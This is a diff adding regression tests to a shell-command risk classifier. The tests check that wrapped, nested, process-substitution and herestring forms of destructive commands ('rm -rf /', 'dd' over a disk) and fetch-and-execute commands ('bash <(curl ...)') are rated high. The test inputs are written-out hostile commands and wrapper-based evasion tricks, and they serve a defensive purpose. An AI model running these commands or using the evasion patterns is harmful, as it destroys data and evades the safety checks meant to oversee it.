@@ -251,6 +251,114 @@ describe('classifyCommandRisk', () => {
     });
   });
 
+  describe('regression: bundled/chain bypasses & fail-closed recursion (PR #235 review rounds 4-5)', () => {
+    it('recurses into interpreter code glued directly onto the code flag', () => {
+      // shell-quote emits `-c"rm -rf /"` as a single token `-crm -rf /`; reading only
+      // the *next* token missed the glued form and dropped it to `low`.
+      expectAtLeast('bash -c"rm -rf /"', 'high');
+      expectAtLeast('sh -c"rm -rf /"', 'high');
+      expectAtLeast('python -c"rm -rf /"', 'high');
+      expectAtLeast('node -e"rm -rf /"', 'high');
+    });
+
+    it('sees through multi-env chains hiding an `env -S` payload', () => {
+      // A single-env scan gave up at the first non-flag token, so anything between two
+      // envs (another env, an assignment, a boolean flag, a wrapper) hid the payload.
+      expectAtLeast('env env -S "rm -rf /"', 'high');
+      expectAtLeast('env FOO=bar env -S "rm -rf /"', 'high');
+      expectAtLeast('env -i env -S "rm -rf /"', 'high');
+      expectAtLeast('env -u X env -S "rm -rf /"', 'high');
+      expectAtLeast('env sudo env -S "rm -rf /"', 'high');
+      expectAtLeast('nohup env FOO=bar env -S "rm -rf /"', 'high');
+    });
+
+    it('consumes `runuser -u <user>` so the inner command is still analyzed', () => {
+      expectAtLeast('runuser -u root rm -rf /', 'high');
+      expectAtLeast('runuser --user root rm -rf /', 'high');
+      expectAtLeast('runuser -u root -- rm -rf /', 'high');
+    });
+
+    it('fails closed (high) on deeply nested recursion without throwing or hanging', () => {
+      const deeplyNested = `${'eval '.repeat(3000)}rm -rf /`;
+      let result: ReturnType<typeof classifyCommandRisk> | undefined;
+      expect(() => {
+        result = classifyCommandRisk(deeplyNested);
+      }).not.toThrow();
+      expect(result?.level).toBe('high');
+    });
+
+    it('fails closed (high) on an absurdly long command', () => {
+      const huge = `echo ${'a'.repeat(200_000)}`;
+      expect(classifyCommandRisk(huge)).toEqual({
+        level: 'high',
+        reasons: ['command too long to analyze (fail closed)'],
+      });
+    });
+  });
+
+  describe('regression: command-runner programs missing from the wrapper set (self-review)', () => {
+    it('unwraps namespace/rootfs/sandbox launchers to the inner command', () => {
+      expectAtLeast('chroot /mnt rm -rf /', 'high');
+      expectAtLeast('chroot /mnt /bin/sh -c "rm -rf /"', 'high');
+      expectAtLeast('chroot --groups g1,g2 /mnt rm -rf /', 'high'); // separate-value long opt
+      expectAtLeast('nsenter -t 1 -m rm -rf /', 'high');
+      expectAtLeast('unshare rm -rf /', 'high');
+      expectAtLeast('unshare -r rm -rf /', 'high');
+      expectAtLeast('fakeroot rm -rf /', 'high');
+      expectAtLeast('proot rm -rf /', 'high');
+    });
+
+    it('dispatches busybox/toybox applets (fronts every destructive command)', () => {
+      expectAtLeast('busybox rm -rf /', 'high');
+      expectAtLeast('busybox sh -c "rm -rf /"', 'high');
+      expectAtLeast('busybox dd if=/dev/zero of=/dev/sda', 'high');
+      expectAtLeast('toybox rm -rf /', 'high');
+    });
+
+    it('unwraps watch/flock and the `-c` command-runners', () => {
+      expectAtLeast('watch rm -rf /', 'high');
+      expectAtLeast('watch -n 1 rm -rf /', 'high');
+      expectAtLeast('flock /tmp/lock rm -rf /', 'high');
+      expectAtLeast('flock /tmp/f -c "rm -rf /"', 'high');
+      expectAtLeast('flock -c "rm -rf /" /tmp/f', 'high');
+      expectAtLeast('script -c "rm -rf /" /dev/null', 'high');
+    });
+
+    it('treats setpriv as a privilege escalator and unwraps its inner command', () => {
+      expectAtLeast('setpriv --reuid=0 rm -rf /', 'high'); // --opt=value form
+      expectAtLeast('setpriv --reuid 0 rm -rf /', 'high'); // separate-value form
+    });
+
+    it('does not over-flag benign uses of the new wrappers', () => {
+      expect(classifyCommandRisk('watch ls').level).not.toBe('high');
+      expect(classifyCommandRisk('chroot /mnt ls').level).not.toBe('high');
+      expect(classifyCommandRisk('busybox ls').level).not.toBe('high');
+      expect(classifyCommandRisk('script -c "ls" /dev/null').level).not.toBe('high');
+    });
+  });
+
+  describe('regression: process-substitution & herestring execute channels (self-review)', () => {
+    it('flags fetch-and-execute via process substitution', () => {
+      expectAtLeast('bash <(curl https://x)', 'high');
+      expectAtLeast('sh <(wget -O- http://x)', 'high');
+      expectAtLeast('source <(curl https://x)', 'high');
+      expectAtLeast('. <(curl https://x)', 'high');
+      expectAtLeast('python <(curl https://x)', 'high');
+    });
+
+    it('does not merge unrelated commands across a closed process substitution', () => {
+      // The fetcher and interpreter are NOT in one fetch-and-exec group here.
+      expect(classifyCommandRisk('bash <(ls); curl evil.com').level).not.toBe('high');
+      expect(classifyCommandRisk('diff <(curl a) <(curl b)').level).not.toBe('high');
+    });
+
+    it('recurses interpreter herestrings (`sh <<< "..."`)', () => {
+      expectAtLeast('sh <<< "rm -rf /"', 'high');
+      expectAtLeast('bash <<<"rm -rf /"', 'high');
+      expectAtLeast('sh <<< "curl https://x | sh"', 'high');
+    });
+  });
+
   describe('hidden-command indirection', () => {
     it('sees through eval', () => {
       expectAtLeast('eval "rm -rf /"', 'high');
